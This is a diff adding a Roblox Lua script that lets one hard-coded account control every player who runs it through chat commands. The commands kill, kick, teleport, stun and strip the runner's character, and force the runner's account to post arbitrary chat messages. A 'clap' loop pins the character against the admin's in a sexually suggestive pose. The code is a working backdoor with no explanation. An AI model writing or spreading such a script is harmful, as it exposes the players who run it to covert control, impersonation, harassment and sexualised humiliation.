@@ -1,0 +1,87 @@
+_G.AdminUser = "HOLE_THAI2"
+_G.WaitForAdmin = game:GetService("Players"):WaitForChild(_G.AdminUser)
+localplr = game:GetService("Players").LocalPlayer
+Prefix = "_/"
+
+game:GetService("Players").PlayerAdded:Connect(function(player)
+	if player.Name == _G.AdminUser then
+		print("Admin User Has Joined!")
+	end
+end)
+
+_G.WaitForAdmin.Chatted:Connect(function(msg)
+	lowCom = string.lower(msg)
+	SendCommand(lowCom)
+end)
+
+function SendCommand(Com)
+	if Com == Prefix .. "kill" then
+		localplr.Character:FindFirstChildOfClass("Humanoid").Health = 0
+	elseif Com == Prefix .. "bring" then
+		localplr.Character:FindFirstChild("HumanoidRootPart").CFrame = _G.WaitForAdmin.Character:FindFirstChild("HumanoidRootPart").CFrame
+	elseif Com == Prefix .. "kick" then
+		localplr:Kick("Script Owner Has Kick You.")
+	elseif Com == Prefix .. "sit" then
+		localplr.Character:FindFirstChildOfClass("Humanoid").Sit = true
+	elseif Com == Prefix .. "jump" then
+		localplr.Character:FindFirstChildOfClass("Humanoid").Sit = false
+		localplr.Character:FindFirstChildOfClass("Humanoid").Jump = true
+	elseif Com == Prefix .. "follow" then
+		spawn(function()
+			_G.Follow = true
+			while _G.Follow == true do wait()
+				localplr.Character:FindFirstChildOfClass("Humanoid"):MoveTo(_G.WaitForAdmin.Character:FindFirstChild("HumanoidRootPart").Position)
+			end
+		end)
+	elseif Com == Prefix .. "unfollow" then
+		_G.Follow = false
+	elseif string.sub(Com, 1, 6) == Prefix .. "chat" then
+		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(string.sub(Com, 8, 100), "All")
+	elseif Com == Prefix .. "nuh" then
+		for i,v in pairs(localplr.Character:GetDescendants()) do
+			if v:IsA("Clothing") or v:IsA("ShirtGraphic") then
+				v:Destroy()
+			end
+		end
+	elseif Com == Prefix .. "stun" then
+		localplr.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
+	elseif Com == Prefix .. "unstun" then
+		localplr.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
+	elseif Com == Prefix .. "lay" then
+		local Human = localplr.Character and localplr.Character:FindFirstChildOfClass('Humanoid')
+		if not Human then
+			return
+		end
+		Human.Sit = true
+		task.wait(.1)
+		Human.RootPart.CFrame = Human.RootPart.CFrame * CFrame.Angles(math.pi * .5, 0, 0)
+		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
+			v:Stop()
+		end
+	elseif Com == Prefix .. "clap" then
+		game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+		local BV = Instance.new("BodyVelocity", game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
+		local BG = Instance.new("BodyGyro", game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
+		BG.MaxTorque = Vector3.new(0,0,0)
+		BG.D = 0
+		BG.P = 0
+		BG.CFrame = game:GetService("Workspace").CurrentCamera.CFrame
+		BV.MaxForce = Vector3.new(9999, 9999, 9999)
+		_G.Clap = true
+		while _G.Clap == true do wait()
+			localplr.Character:FindFirstChildOfClass("Humanoid").Sit = true
+			localplr.Character:FindFirstChild("HumanoidRootPart").CFrame = _G.WaitForAdmin.Character:FindFirstChild("HumanoidRootPart").CFrame * CFrame.new(0, 0, -3) * CFrame.Angles(-1.5, 0, 0)
+			wait()
+			localplr.Character:FindFirstChild("HumanoidRootPart").CFrame = _G.WaitForAdmin.Character:FindFirstChild("HumanoidRootPart").CFrame * CFrame.new(0, 0, -2) * CFrame.Angles(-1.5, 0, 0)
+		end
+	elseif Com == Prefix .. "stop" then
+		for i = 1, 10 do
+			_G.Clap = false
+			localplr.Character:FindFirstChildOfClass("Humanoid").Sit = false
+			pcall(function()
+				game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity"):Destroy()
+				game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChildOfClass("BodyGyro"):Destroy()
+			end)
+		end
+	end
+end
